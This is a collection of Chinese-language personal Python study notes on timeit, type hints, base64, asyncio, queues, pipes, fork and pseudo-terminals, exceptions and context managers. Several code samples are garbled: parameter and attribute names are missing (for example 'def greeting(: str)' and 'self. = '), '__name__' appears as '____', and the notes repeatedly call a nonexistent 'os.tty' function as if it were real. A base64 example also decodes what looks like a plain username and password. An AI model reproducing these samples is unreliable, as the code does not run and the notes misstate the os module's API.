#命令行调用
python -m timeit [-n N] [-r N] [-s S] [-t] [-c] [-h] [statement   ]

-n N 执行指定语句的次数
-r N 重复测量的次数(默认3次)
-s S 指定初始化代码活构建环境的导入语句(默认pass)
python 3.3新增
-t 使用time.time() (不推荐)
-c 使用time.clock() (不推荐)
-v 打印原始计时结果
-h 帮助

$ python -m timeit '"-".join(str(n) for n in range(100))'
10000 loops, best of 3: 40.3 usec per loop
$ python -m timeit '"-".join([str(n) for n in range(100)])'
10000 loops, best of 3: 33.4 usec per loop
$ python -m timeit '"-".join(map(str, range(100)))'
10000 loops, best of 3: 25.2 usec per loop
}

#python36新增了很多新特性,学习的同时也对之前的知识点加以巩固,可能部分知识会与上面重复
python36学习记录{

支持类型提示 typing{
def greeting(: str) -> str:
	return 'Hello ' + 

#在函数greeting中,参数名称的类型为str,返回类型为str。 接受子类型作为参数。
#例子
>>> def gg(:str)->str:
	return 'hello'+

>>> gg('a')
'helloa'
>>> gg('bbb')
'hellobbb'
>>> gg(1)
Traceback (most recent call last):
  File "<pyshell#19>", line 1, in <module>
	gg(1)
  File "<pyshell#16>", line 2, in gg
	return 'hello'+
TypeError: must be str, not int
>>>


}

base64{
import base64
>>> base64.decodebytes(b'c3Vic2NyaWJlcjpTc01pbmkxQA==').decode('utf8')
'subscriber:SsMini1@'
>>> base64.encodebytes(b'subscriber:SsMini1@')
b'c3Vic2NyaWJlcjpTc01pbmkxQA==\n'
}

asyncio{
#http://www.cnblogs.com/styier/p/6415850.html  例子

#程序总共等待10.7s
import asyncio
async def print5s():
       print("开始运行！")
       await asyncio.sleep(5.0) #挂起后台运行
       print("结束运行！")

async def print10s():
       print("开始运行！")
       await asyncio.sleep(10.0) #挂起后台运行
       print("结束运行！")

loop = asyncio.get_event_loop()

a=loop.create_task(print5s())
b=loop.create_task(print10s())
tasks=[a,b]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
#或者这样写
import asyncio

async def print5s():
    print("开始运行！")
    await asyncio.sleep(5.0)  # 挂起后台运行
    print("结束运行！")


async def print10s():
    print("开始运行！")
    await asyncio.sleep(10.0)  # 挂起后台运行
    print("结束运行！")

loop = asyncio.get_event_loop()
tasks = [print5s(), print10s()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()


#程序总共等待5s
import asyncio

async def compute(x, y):
    print("Compute %s + %s    " % (x, y))
    await asyncio.sleep(5.0)
    return x + y

async def print_sum(x, y):
    result = await compute(x, y)
    print("%s + %s = %s" % (x, y, result))

loop = asyncio.get_event_loop()
tasks = [print_sum(1,2),print_sum(3,4)]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()

#程序总共等待2s
import asyncio

async def my_task(seconds):
    print("This task is take {} seconds to cpmplete".format(seconds))
    await asyncio.sleep(seconds)
    return "task finished"

if ____ == "__main__":
    my_event_loop = asyncio.get_event_loop()
    tasks = []
    try:
        print("task creation started")
        task_obj1 = my_event_loop.create_task(my_task(seconds = 2))
        task_obj2 = my_event_loop.create_task(my_task(seconds = 2))
        task_obj3 = my_event_loop.create_task(my_task(seconds = 2))
        tasks = [task_obj1,task_obj2,task_obj3]		#创建事件循环的列表
        #my_event_loop.run_until_complete(tasks)
        my_event_loop.run_until_complete(asyncio.wait(tasks)) #创建事件循环的列表
    finally:
        my_event_loop.close()

#可以看出 是在同一个线程中执行的
import threading
import asyncio


async def hello():
    print('Hello world! (%s)' % threading.currentThread())
    asyncio.sleep(1)
    print('Hello again! (%s)' % threading.currentThread())

loop = asyncio.get_event_loop()
tasks = [hello(), hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()


#使用Process类控制子进程和StreamReader类从标准输出读取的示例。子过程由create_subprocess_exec()函数创建：
import asyncio.subprocess
import sys

@asyncio.coroutine
def get_date():
    code = 'import datetime; print(datetime.datetime.now())'

    # Create the subprocess, redirect the standard output into a pipe
    create = asyncio.create_subprocess_exec(sys.executable, '-c', code,
                                            stdout=asyncio.subprocess.PIPE)
    proc = yield from create

    # Read one line of output
    data = yield from proc.stdout.readline()
    line = data.decode('ascii').rstrip()

    # Wait for the subprocess exit
    yield from proc.wait()
    return line

if sys.platform == "win32":
    loop = asyncio.ProactorEventLoop()
    asyncio.set_event_loop(loop)
else:
    loop = asyncio.get_event_loop()

date = loop.run_until_complete(get_date())
print("Current date: %s" % date)
loop.close()

#async和await是Python 3.5中新添加的关键词,用来定义一个原生的协程,以便于和基于协程的生成器相区别。
在Python 3.4中,你可以按照如下方式创建一个协程,
import asyncio
@asyncio.coroutine
def my_foo():
    yield from func()
这个装饰器在Python 3.5中依然有效,但是模块的类型有所更新,协程函数可以告诉你正在交互的是不是一个原生的协程。从Python 3.5开始,
你可以使用async def这种语法来定义一个协程函数,所以上述函数可以按照如下方式定义,

import asyncio
async def my_coro():
    await func()

}

queue 队列{
import queue
#测试定义类传入队列
class Foo(object):
    def __init__(self,n):
        self.n = n
new = queue.Queue(maxsize=3)
print('先进先出')
new.put(1)
new.put(Foo(1),timeout=2) # 超时时间后,抛出队列full异常
new.put([1, 2, 3],timeout=2)
print(new.full()) #判断队列是否满 True
#new.put("abc",timeout=1) #队列已满,再放报错
print(new.qsize()) # 查看当前队列长度
print(new.get())
print(new.get())
print(new.get())
print(new.empty()) #判断队列是否为空 True
#print(new.get_nowait()) #队列已空,取不到数据报异常
print('后进先出')
q = queue.LifoQueue() #指定使用LifoQueue
q.put(3)
q.put(2)
print(q.get_nowait())
print(q.get_nowait())

print('存入一个元组,第一个为优先级,第二个为数据,第三个默认超时时间')
new = queue.PriorityQueue(maxsize=3)
new.put((10,[1,2,3]))
new.put((5,"strings"))
new.put((20,"strings"))
print(new.get_nowait())
print(new.get_nowait())
print(new.get_nowait())


import threading, queue, time
#生产者消费者模型为了程序松耦合,多对多
def consumer(n):
    while True:
        print(" consumer [%s]  get task: %s" % (n, q.get()))
        time.sleep(1)  # 每秒吃一个
        q.task_done()  # get()1次通知队列减少1

def producter(n):
    count = 1
    while True:
        print("producter [%s] produced a new task : %s" % (n, count))
        q.put(count)
        count += 1
        q.join()  #消息阻塞 队列为空重新触发
        print("all task has been cosumed by consumers    ")

q = queue.Queue()
c1 = threading.Thread(target=consumer, args=[1, ])
c2 = threading.Thread(target=consumer, args=[2, ])
c3 = threading.Thread(target=consumer, args=[3, ])
p1 = threading.Thread(target=producter, args=["p1", ])
p2 = threading.Thread(target=producter, args=["p2", ])
c1.start()
c2.start()
c3.start()
p1.start()
p2.start()
}

####################################################################################################
#1.研究pty项目sh中,为什么在第一个pythonshell中导入ifconfig后能获取返回,两个伪终端如何传递数据库的？
#2.在子进程中执行shell后返回结果到父进程 在不使用subprocess的情况下,进程间怎么交互数据

os.popen()调用的是subprocess 库,找到subprocess.Popen('dwad',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
{
def __init__(self, args, bufsize=-1, executable=None,
                 stdin=None, stdout=None, stderr=None,
                 preexec_fn=None, close_fds=_PLATFORM_DEFAULT_CLOSE_FDS,
                 shell=False, cwd=None, env=None, universal_newlines=False,
                 startupinfo=None, creationflags=0,
                 restore_signals=True, start_new_session=False,
                 pass_fds=(), *, encoding=None, errors=None):

感觉全是io库中的函数


os.openpty()                    # 打开一个新的伪终端对。返回 pty 和 tty 的文件描述符。
os.pipe()                       # 创建一个管道. 返回一对文件描述符(r, w) 分别为读和写
os.popen(command[, mode[, bufsize]])  # 从一个 command 打开一个管道
os.read(fd, n)                  # 从文件描述符 fd 中读取最多 n 个字节,返回包含读取字节的字符串,文件描述符 fd对应文件已达到结尾, 返回一个空字符串。
os.write(fd, str)               # 写入字符串到文件描述符 fd中. 返回实际写入的字符串长度
os.tty(fd)                  # 返回一个字符串,它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联,则引发一个异常。

'''
os.dup2(fd,fd2,inheritable = True)
#将文件描述符fd复制到fd2,如有必要,关闭后者。------就是将fd2重定向到fd
'''

>>> os.pipe() #8用于写,7用于读
(7, 8)
>>> os.write(8,b'1122')
4
>>> os.read(7,10)
b'1122'


>>> os.openpty()
(11, 12)
>>> os.tty(11)
'/dev/ptmx'
>>> os.tty(12) #并没有在linux上真实产生一个/dev/pts/9
'/dev/pts/9'

11是主,12是从
#任何从主设备的输入都会输出到从设备上


#! /usr/bin/env python
#coding=utf-8

import pty
import os
import select

def mkpty():
    # 打开伪终端
    master1, slave = pty.openpty()
    slave1 = os.tty(slave)
    master2, slave = pty.openpty()
    slave2 = os.tty(slave)
    print ('\nslave device s: ', slave1, slave2)
    return master1, master2

if ____ == "__main__":

    master1, master2 = mkpty()
    while True:
        rl, wl, el = select.select([master1,master2], [], [], 1)
        for master in rl:
            data = os.read(master, 128)
            print ("read %d data." % len(data))
            if master==master1:
                os.write(master2, data)
            else:
                os.write(master1, data)



python3.4 test_pty.py &
#另一终端上执行
root@api:/home/lgj/pty# echo 11 > /dev/pts/12
root@api:/home/lgj/pty# echo 11 > /dev/pts/11

#本终端显示
root@api:/home/lgj/pty# read 4 data.
the data: b'11\r\n'
root@api:/home/lgj/pty# read 4 data.
the data: b'11\r\n'
#主从伪终端
>>> os.openpty()
(4, 5)
>>> os.tty(4)
'/dev/ptmx'
>>> os.tty(5)
'/dev/pts/9'
>>> os.write(4,b'ls\r\n')
4
>>> os.read(4,100)
b'ls\r\n\r\n'
>>> os.read(5,100)
b'ls\n'
>>> os.read(5,100)
b'\n'

#管道
>>> os.pipe()
(6, 7)
>>> os.write(7,str(1).encode('utf-8'))
1
>>> os.read(6,10)
b'1'

>>> a=open("lgj",'a')
>>> a.fileno() #文件句柄
8
>>> os.dup(8) #复制文件句柄
9

'''
os.dup2(fd,fd2,inheritable = True)
#将文件描述符fd重复到fd2,如有必要,关闭后者。也就是说往fd2上读写就是往fd上,将fd2重定向到fd
'''

命令tty 查看当前终端对应的设备
ps -ax 查看进程对应的控制台

pts(pseudo-terminal slave)是pty的实现方法,与ptmx(pseudo-terminal master)配合使用实现pty。
1、串行端口终端(/dev/ttySn)
2、伪终端(/dev/pty/)
3、控制终端(/dev/tty)
4、控制台终端(/dev/ttyn, /dev/console)
5、虚拟终端(/dev/pts/n)
/dev/tty代表当前tty设备,在当前的终端中输入 echo "hello" > /dev/tty ,都会直接显示在当前的终端中。

os.execv("/sbin/ifconfig",('-a',)) #可以输出ifconfig的返回

#应该是在子进程中执行os.execv("/sbin/ifconfig",('-a',)) 然后读取输出。

'''
stdin,stdout是设置是否打开这些管道,如果他的值是subprocess.PIPE的话,就会打开,同stdin一样的还有stderr
参数stdin, stdout, stderr分别表示程序的标准输入、输出、错误句柄。他们可以是PIPE,文件描述符或文件对象,也可以设置为None,表示从父进程继承。
可以在Popen()建立子进程的时候改变标准输入、标准输出和标准错误,并可以利用subprocess.PIPE将多个子进程的输入和输出连接在一起,构成管道(pipe):

import subprocess
child1 = subprocess.Popen(["ls","-l"], stdout=subprocess.PIPE)
child2 = subprocess.Popen(["wc"], stdin=child1.stdout,stdout=subprocess.PIPE)
out = child2.communicate()
print(out)
# http://www.cnblogs.com/icejoywoo/p/3627397.html
# http://www.cnblogs.com/yangxudong/p/3753846.html
在POSIX上,subprocess类使用os.execvp() - 类行为来执行子程序。 在Windows上,类使用Windows CreateProcess()函数
'''
sys.stdin.fileno()
>>> import os
>>> import sys
>>> sys.stdin.fileno()
0
>>> os.tty(0)
'/dev/pts/2'
>>> os.tty(1)
'/dev/pts/2'
>>> os.tty(2)
'/dev/pts/2'
>>> os.tty(3)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
OSError: [Errno 9] Bad file descriptor
>>>
>>> os.openpty()
(4, 5)
>>> os.tty(4)
'/dev/ptmx'
>>> os.tty(5)
'/dev/pts/10'

fd_r_list, fd_w_list, fd_e_list = select.select(rlist, wlist, xlist, [timeout])

参数： 可接受四个参数(前三个必须)
rlist: wait until ready for reading
wlist: wait until ready for writing
xlist: wait for an "exceptional condition"
timeout: 超时时间

返回值：三个列表

select方法用来监视文件描述符(当文件描述符条件不满足时,select会阻塞),当某个文件描述符状态改变后,会返回三个列表
1、当参数1 序列中的fd满足"可读"条件时,则获取发生变化的fd并添加到fd_r_list中
2、当参数2 序列中含有fd时,则将该序列中所有的fd添加到 fd_w_list中
3、当参数3 序列中的fd发生错误时,则将该发生错误的fd添加到 fd_e_list中


}

os.fork()
{
ret = os.fork()
if ret == 0:
    child_suite # 子进程代码
else:
    parent_suite # 父进程代码

#Python中的fork() 函数可以获得系统中进程的PID ( Process ID ),返回0则为子进程,否则就是父进程,然后可以据此对运行中的进程进行操作；
}

异步执行
os.fork()
{

import os
import sys
import time

processNmae = '父进程'
print ("Program executing ntpid:%d,processNmae:%s"%(os.getpid(),processNmae))
#attempt to fork child process
try:
    forkPid = os.fork()
except OSError:
    sys.exit("Unable to create new process.")
# Am I parent process?
if forkPid != 0:
    process = "父进程"
    print ("Parent executingn"+"tpid:%d,forkPid:%d,processNmae:%s"%(os.getpid(), forkPid,process))
# Am I child process?
elif forkPid == 0:
        process = "子进程"
        print ("Child executingn" + "tpid: %d, forkPid: %d, process: %s" % (os.getpid(), forkPid,process))
        print ("Process finishingntpid: %d, process: %s" % (os.getpid(), process))


''' 都能打印在一起,应该是子进程继承了父进程的输入输出端
root@api:/home/lgj/pty# python3.4 cmd_pty2.py
Program executing ntpid:121728,processNmae:父进程
Parent executingntpid:121728,forkPid:121729,processNmae:父进程
Child executingntpid: 121729, forkPid: 0, process: 子进程
Process finishingntpid: 121729, process: 子进程

#########################下面这段话很重要##############################
程序每次执行时,操作系统就会创建一个新的进程来运行程序指令。进程还可以调用os.fork,要求操作系统新建一个进程。"父进程"是调用os.fork的进程。父进程所创建的任何进程都是子进程。每个进程都有一个不重复的"进程ID号",或称"pid",它对进程进程进行标识。进程调用fork函数时,操作系统会新建一个子进程,它本质上与父进程完全相同。子进程从父进程继承了多个值的拷贝,比如全局变量和环境变量。两个进程唯一的区别就是fork的返回值。
child(子)进程接收返回值为0,而父进程接收子进程的pid作为返回值。调用fork函数后,两个进程并发执行同一个程序,首先执行的是调用了fork之后的下一行代码。父进程和子进程既并发执行,又相互独立；也就是说,它们是"异步执行"的。
'''

'''
pid, fd =os.forkpty()
分叉子进程,使用新的伪终端作为子进程的控制终端。 返回一对(pid,fd),其中pid在新子进程中为0,在父进程中为新子进程在父进程中的id,fd是伪终端的主端的文件描述符。 对于更便携的方法,使用pty模块。 如果出现错误,则引发OSError。
>>> os.forkpty()
(123573, 4)
>>> os.tty(4)
'/dev/ptmx'
'''



}

子进程与父进程(pid,ppid)
{
import os
import sys
def runpager():
    fdin, fdout = os.pipe()
    pid = os.fork()
    print("fdin,fdout,pid,ppid",fdin,fdout,pid,os.getppid())
    print("sys.stdin.fileno(),sys.stdout.fileno(),sys.stderr.fileno()",sys.stdin.fileno(),sys.stdout.fileno(),sys.stderr.fileno())
    if pid == 0:
        os.close(fdin)
        os.dup2(fdout, sys.stdout.fileno())
        os.dup2(fdout, sys.stderr.fileno())
        os.close(fdout)
        return
    os.dup2(fdin, sys.stdin.fileno())
    os.close(fdin)
    os.close(fdout)
    #os.execvp('/bin/ls', ['/bin/ls', '-l'])
    os.execvp('/bin/sleep', ['/bin/sleep','10'])

a=input("a=")
print("pid",os.getpid())
print("ppid",os.getppid())
runpager()

'''
##########################################################################

root@api:/home/lgj/pty# python3.4 cmd_pty1.py
a=1
pid 118983
ppid 109823
fdin,fdout,pid,ppid 3 4 119005 109823
sys.stdin.fileno(),sys.stdout.fileno(),sys.stderr.fileno() 0 1 2
fdin,fdout,pid,ppid 3 4 0 118983
sys.stdin.fileno(),sys.stdout.fileno(),sys.stderr.fileno() 0 1 2


root@api:~# ps -ef|grep python
root     118983 109823  0 16:29 pts/10   00:00:00 python3.4 cmd_pty1.py
root@api:~# ps -ef|grep sleep
root     118996 115824  0 16:29 pts/2    00:00:00 grep --color=auto sleep
root@api:~#
##输入a后
root@api:~# ps -ef|grep python
root     119005 118983  0 16:29 pts/10   00:00:00 [python3.4] <defunct>
root@api:~# ps -ef|grep sleep
root     118983 109823  0 16:29 pts/10   00:00:00 /bin/sleep 10
root@api:~#


#exec 函数都执行一个新的程序,然后用新的程序替换当前子进程的进程空间,而该子进程从新程序的main函数开始执行。在Unix下,该新程序的进程id是原来被替换的子进程的进程id。在原来子进程中打开的所有描述符默认都是可用的,不会被关闭。
##########################################################################
root@api:~# ps -ef|grep python
root     115968 115967  0 16:05 pts/10   00:00:00 [python3.4] <defunct>
root     115974 115824  0 16:06 pts/2    00:00:00 grep --color=auto python
         PID    PPID
UID     //用户ID、但输出的是用户名
PID     //进程的ID
PPID    //父进程ID

>>> import os
>>> os.getuid()
0
>>> os.getpid()
116485
>>> os.getppid()
115824

root@api:~# ps -ef|grep python
root     116485 115824  0 16:10 pts/2    00:00:00 python3.4
root     116565 116523  0 16:11 pts/11   00:00:00 grep --color=auto python

'''

}

Python进程间通信之匿名管道
{

#管道是一个单向通道,有点类似共享内存缓存.管道有两端,包括输入端和输出端.对于一个进程的而言,它只能看到管道一端,即要么是输入端要么是输出端.

os.pipe()返回2个文件描述符(r, w),表示可读的和可写的.示例代码如下:

#!/usr/bin/python
import time
import os

def child(wpipe):
    print('hello from child', os.getpid())
    while True:
        msg = 'how are you\n'.encode()
        os.write(wpipe, msg)
        time.sleep(1)

def parent():
    rpipe, wpipe = os.pipe()
    pid = os.fork()
    if pid == 0:
        child(wpipe)
        assert False, 'fork child process error!'
    else:
        os.close(wpipe)
        print('hello from parent', os.getpid(), pid)
        while True:
            recv = os.read(rpipe, 32)
            print (recv)

parent()
输出如下:

('hello from parent', 5053, 5054)
('hello from child', 5054)
how are you

how are you

how are you

how are you
我们也可以改进代码,不用os.read()从管道中读取二进制字节,而是从文件对象中读取字符串.这时需要用到os.fdopen()把底层的文件描述符(管道)包装成文件对象,然后再用文件对象中的readline()方法读取.这里请注意文件对象的readline()方法总是读取有换行符'\n'的一行,而且连换行符也读取出来.还有一点要改进的地方是,把父进程和子进程的管道中不用的一端关闭掉.

#!/usr/bin/python
import time
import os

def child(wpipe):
    print('hello from child', os.getpid())
    while True:
        msg = 'how are you\n'.encode()
        os.write(wpipe, msg)
        time.sleep(1)

def parent():
    rpipe, wpipe = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(rpipe)
        child(wpipe)
        assert False, 'fork child process error!'
    else:
        os.close(wpipe)
        print('hello from parent', os.getpid(), pid)
        fobj = os.fdopen(rpipe, 'r')
        while True:
            recv = fobj.readline()[:-1]
            print (recv)

parent()
输出如下:

('hello from parent', 5108, 5109)
('hello from child', 5109)
how are you
how are you

#如果要与子进程进行双向通信,只有一个pipe管道是不够的,需要2个pipe管道才行.以下示例在父进程新建了2个管道,然后再fork子进程.os.dup2()实现输出和输入的重定向.spawn功能类似于subprocess.Popen(),既能发送消息给子进程,由能从子子进程获取返回数据.
?

#!/usr/bin/python
#coding=utf-8
import os, sys

def spawn(prog, *args):
    stdinFd = sys.stdin.fileno()
    stdoutFd = sys.stdout.fileno()

    parentStdin, childStdout = os.pipe()
    childStdin, parentStdout= os.pipe()

    pid = os.fork()
	#程序分叉,子进程中关闭父进程的文件符并将自己用到的文件符重定向到通道,父进程中关闭子进程的文件符并将自己用到的文件符重定向到通道
    if pid: #父进程
        os.close(childStdin)
        os.close(childStdout)
        os.dup2(parentStdin, stdinFd)#输入流绑定到管道,将输入重定向到管道一端parentStdin
        os.dup2(parentStdout, stdoutFd)#输出流绑定到管道,发送到子进程childStdin
    else:   #子进程
        os.close(parentStdin)
        os.close(parentStdout)
        os.dup2(childStdin, stdinFd)#输入流绑定到管道
        os.dup2(childStdout, stdoutFd)
        args = (prog, ) + args
        os.execvp(prog, args)
        assert False, 'execvp failed!'

if ____ == '__main__':
    mypid = os.getpid()
    spawn('python', 'pipetest.py', 'spam')

    print 'Hello 1 from parent', mypid #打印到输出流parentStdout, 经管道发送到子进程childStdin
    sys.stdout.flush()
    reply = raw_input()
    sys.stderr.write('Parent got: "%s"\n' % reply)#stderr没有绑定到管道上

    print 'Hello 2 from parent', mypid
    sys.stdout.flush()
    reply = sys.stdin.readline()#另外一种方式获得子进程返回信息
    sys.stderr.write('Parent got: "%s"\n' % reply[:-1])

pipetest.py代码如下:

#coding=utf-8
import os, time, sys

mypid = os.getpid()
parentpid = os.getppid()
sys.stderr.write('child %d of %d got arg: "%s"\n' %(mypid, parentpid, sys.argv[1]))

for i in range(2):
    time.sleep(3)
    recv = raw_input()#从管道获取数据,来源于父经常stdout
    time.sleep(3)
    send = 'Child %d got: [%s]' % (mypid, recv)
    print(send)#stdout绑定到管道上,发送到父进程stdin
    sys.stdout.flush()
输出:

child 7265 of 7264 got arg: "spam"
Parent got: "Child 7265 got: [Hello 1 from parent 7264]"
Parent got: "Child 7265 got: [Hello 2 from parent 7264]"

}

伪终端tty\pty
{
import os
import sys
import time
import pty
import select
#################使用pty和select 处理子进程的返回, 这样的用例是不能在shell中一步一步敲的,因为存在两个进程
pid, fd = pty.fork()
print(pid) #你会发现这里打印了两个值
mystr=""
#处理子进程
if pid == 0:
	os.execvp('/bin/ls', ['/bin/ls', '-l'])
#处理父进程,监听子进程中的返回
if pid !=0:
	while True:
		i, o, e = select.select([fd], [], [], 2)
		if fd in i:
			try:
				bytes = os.read(fd,600)
				mystr=bytes.decode("utf-8")+mystr
				print(bytes.decode("utf-8"))
			except OSError:
				print("子进程监听结束")
				break
#继续处理父进程
print("==============")
print(mystr) #父进程中取得了子进程的返回！

'''
pid, fd = pty.fork()
程序分叉。 将子进程的控制终端连接到伪终端,返回值为(pid,fd)。注意: 子进程获取pid为0,fd在子进程中是无效的。fork返回非0的pid是子进程的在父进程中的pid,fd是连接到子进程的控制终端(以及子进程的标准输入和输出)的文件描述符。

fd_r_list, fd_w_list, fd_e_list = select.select(rlist, wlist, xlist, [timeout])
 select方法用来监视文件描述符(当文件描述符条件不满足时,select会阻塞),当某个文件描述符状态改变后,会返回三个列表
1、当参数1 序列中的fd满足"可读"条件时,则获取发生变化的fd并添加到fd_r_list中
2、当参数2 序列中含有fd时,则将该序列中所有的fd添加到 fd_w_list中
3、当参数3 序列中的fd发生错误时,则将该发生错误的fd添加到 fd_e_list中
'''
#################使用os.fork,pipe 处理子进程的返回,不使用pty又怎么写呢？pty.fork会把子进程的fd返回给父进程读取,这样很方便进程间的交流。
'''
os.dup2(fd,fd2,inheritable = True)  #最大的作用就是重定向,将fd2重定向到fd。
#将文件描述符fd重复到fd2,如有必要,关闭后者。
'''
##通常一个进程打开伪终端设备,然后调用fork。子进程建立了一个新会话,打开一个相应的伪终端从设备,将其描述符复制到标准输入、标准输出和标准出错,然后调用exec。伪终端从设备成为子进程的控制终端。
# encoding: utf-8
import os
import sys
import time

def child(master, slave):
    os.close(master) #关闭不需要的主设备,因为主设备是给父进程传送指令到子进程的
    os.dup2(slave, 0) #最大的作用就是重定向,将子进程中的0,1,2 都重定向到从端。
    os.dup2(slave, 1)
    os.dup2(slave, 2)
    os.execvp("/bin/bash", ["bash", "-l", "-i"])
	#os.execvp("/bin/ls", ["bash", "-l", "-i"])


def parent():
    master, slave = os.openpty() #新建虚拟终端,将从端分配给子进程,主端给主进程。#打开一个新的伪终端对。 分别为pty和tty返回一对文件描述符(主,从)
    new_pid = os.fork()
    if new_pid == 0:
        child(master, slave)

    time.sleep(0.1)
    os.close(slave) #关闭主进程中的从设备

    os.write(master, b"fg\n") #把作业放置前台执行,下发指令到子进程,将子进程中的执行放到前台
    time.sleep(0.1)
   # _ = os.read(master, 1024) #>>见后面的解析1

    #os.write(master, (sys.argv[1] + "\n").encode('utf8'))
    time.sleep(0.1)
    lines = []
    while True:
        tmp = os.read(master, 1024)
        tmp=tmp.decode('utf8')
        lines.append(tmp)
        if len(tmp) < 1024:
            break
    output = "".join(lines)
    output = "\n".join(output.splitlines()[1:])
    print (output)

parent()

'''
#执行结果
解析1,注释掉后会多打印这些东西。这些是父进程中的多余数据,可以先读出丢弃
bash: no job control in this shell
root@api:/home/lgj/pty# fg
bash: fg: no job control
root@api:/home/lgj/pty# ll

bg(将作业放置于后台执行)(在前台执行时间过长,则可以按ctrl+z,暂停进程,用bg放其至后台)
bg 作业ID
fg(把作业放置前台执行)
jobs(查看后台作业)

#http://www.cnblogs.com/nufangrensheng/p/3577853.html
##通常一个进程打开伪终端设备,然后调用fork。子进程建立了一个新会话,打开一个相应的伪终端从设备,将其描述符复制到标准输入、标准输出和标准出错,然后调用exec。伪终端从设备成为子进程的控制终端。

对于ssh,telnet等远程登录程序而言,当你ssh到某个sshd服务器上去时,这个sshd会打开一个伪终端主设备,然后fork出一个子进程,在子进程中打开一个从设备,
这样,主进程和子进程之间就可以通过伪终端的主从设备进行交流,任何从主设备的输入都会输出到从设备上
使用主从伪终端之后,当sshd收到指令时会将指令输入到主设备,然后主设备会把执行输出到从设备,这样就相当于指令输入到了从设备,而从设备是和某个shell连接的,从而这个指令或者毫无意义的字符串就被发往了远程的shell去解释
'''

#使用 python3.4 cmd_pty1.py ls

}

双通道{
#!/usr/bin/python
import time
import os

def child(wpipe,rpipe1):
	print("""child's pid:""", os.getpid())
	for x in range(100):
		print("子程序读取到:",os.read(rpipe1,1024))
		msg = (str(x)+'from son\n').encode()
		print("子进程发送:")
		os.write(wpipe, msg)
		time.sleep(1)

def parent():
	rpipe, wpipe = os.pipe() #子进程的写,和父进程的读
	rpipe1, wpipe1 = os.pipe() #父进程的写,和子进程的读
	pid = os.fork()
	if pid == 0:
		os.close(rpipe)
		os.close(wpipe1)
		child(wpipe,rpipe1)
		assert False, 'fork child process error!'
	else:
		os.close(wpipe)
		os.close(rpipe1)
		print("""parent,child's pid:""", os.getpid(), pid)
		fobj = os.fdopen(rpipe, 'r')
		for x in range(100):
			print("父进程发送:")
			os.write(wpipe1,(str(x)+'from father\n').encode())
			print("父进程读取:")
			print (fobj.readline())

parent()
}
####################################################################################################

try     except {

#http://www.cnblogs.com/ybwang/p/4738621.html 执行顺序
#http://www.cnblogs.com/xu-rui/p/6477271.html with的内部实现

try:
	print(1)
	raise Exception('hehe')
except Error:
	print(2)
except IndexError:
	print(3)
except KeyError:
	print(4)
except Exception:
	print(7)
else:
	print(5)
finally:
	print(6)
#Exception 是异常全捕获,可以捕获所有异常！
try:
    input("a=")
except KeyboardInterrupt:
    print ("User Press Ctrl+C,Exit")
except EOFError:
    print ("User Press Ctrl+D,Exit")
#捕获用户输入异常

try     except 语句可以带有一个 else子句 ,该子句只能出现在 有 except 子句之后。try语句没有出现异常时,还想要行执行一些代码,可以使这个子句。例 :
for arg in sys.argv[1:]:
	try:
		f = open(arg, 'r')
	except IOError:
		print('cannot open', arg)
	else:
		print(arg, 'has', len(f.readlines()), 'lines')
		f.close()
#例子
def dome():
	try:
		a=7
		print(1)
	except OSError:
		print(2)
	else:
		print(3)
		return a
	a=8
	print(5)
	return a

print(dome())


'''result
1
3
7
'''

#####
try:
    x = int(input('input x:'))
    y = int(input('input y:'))
    print('x/y = ',x/y)
except ZeroDivisionError: #捕捉除0异常
    print("ZeroDivision")
except (TypeError,ValueError) as e: #捕捉多个异常,并将异常对象输出
    print(e)
except: #捕捉其余类型异常
    print("it's still wrong")
else: #没有异常时执行
    print('it works well')
finally: #不管是否有异常都会执行
    print("Cleaning up")


1. 如果没有异常发生, try中有return 语句, 这个时候else块中的代码是没有办法执行到的, 但是finally语句中如果有return 语句会修改最终的返回值, 我个人理解的是try中return 语句先将要返回的值放在某个 CPU寄存器,然后运行finally语句的时候修改了这个寄存器的值,最后在返回到try中的return语句返回修改后的值。
2. 如果没有异常发生, try中没有return语句,那么else块的代码是执行的,但是如果else中有return, 那么也要先执行finally的代码, 返回值的修改与上面一条一致。
3. 如果有异常发生,try中的return语句肯定是执行不到, 在捕获异常的 except语句中,如果存在return语句,那么也要先执行finally的代码,finally里面的代码会修改最终的返回值,然后在从 except 块的retrun 语句返回最终修改的返回值, 和第一条一致。

# 探索with的处理过程
# http://www.cnblogs.com/chenny7/p/4213447.html
# http://www.cnblogs.com/xu-rui/p/6477271.html


class Context:
    def __init__(self, ):
        self. = 

    def __enter__(self):
        print("Begin.__enter__")
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        print("End.__exit__")

    def context(self):
        print("This is context    {}".format(self.))

# 如果带上 as 变量,那么__enter__()方法必须得返回一个东西,要不然会报错..
with Context("xurui") as context:
    print("1         ..")
    context.context()
    print("2         ..")
with Context("xurui"):
    print("3         ..")
    Context("xurui").context()
    print("4         ..")


# 不能对Python的任意符号使用with语句,它仅能工作于支持上下文管理协议(context management protocol)的对象
# file
# decimal.Context
# thread.LockType
# threading.Lock
# threading.RLock
# threading.Condition
# threading.Semaphore
# threading.BoundedSemaphore

# 当我们需要自定义一个上下文管理器类型的时候,就需要实现__enter__和__exit__方法,这对方法就称为上下文管理协议
# __enter__ 方法将在进入代码块前被调用。
# __exit__ 方法则在离开代码块之后被调用(即使在代码块中遇到了异常)。


# 进阶
print("python库中还有一个模块contextlib,使你不用构造含有__enter__, __exit__的类就可以使用with")
from contextlib import contextmanager


@contextmanager
def context():
    print('entering the zone')
    try:
        yield
    except (Exception, e):
        print('with an error %s' % e)
        raise e
    else:
        print('with no error')

with context():
    print('----in context call------')


print("python库中还有一个模块contextlib,使你不用构造含有__enter__, __exit__的类就可以使用with")
import queue
import contextlib


@contextlib.contextmanager
def worker_state(xxx, val):
    xxx.append(val)
    # print(xxx)
    try:
        yield
    finally:
        xxx.remove(val)
        # print(xxx)


q = queue.Queue()
li = []
q.put("xurui")
with worker_state(li, 1):
    print("before", li)
    q.get()
print("after", li)


print("python库中还有一个模块contextlib,使你不用构造含有__enter__, __exit__的类就可以使用with")
import contextlib


@contextlib.contextmanager
def MyOpen(file, mode):
    try:
